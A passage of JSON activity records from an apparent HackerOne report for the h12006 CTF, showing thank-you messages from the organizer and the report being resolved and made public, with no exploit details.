write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:03:10.619Z","updated_at":"2020-06-11T23:03:10.619Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324964,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:28:13.038Z","updated_at":"2020-06-17T22:28:13.038Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"njbooher","url":"/njbooher"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8325918,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-17T23:47:12.405Z","updated_at":"2020-06-17T23:47:12.405Z","first_to_agree":true,"actor":{"username":"njbooher","cleared":true,"url":"/njbooher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8gBaXxZaVswNz1ZdTYSp5vLP/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8326012,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T00:09:28.191Z","updated_at":"2020-06-18T00:09:28.191Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8326013,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T00:09:28.295Z","updated_at":"2020-06-18T00:09:28.295Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}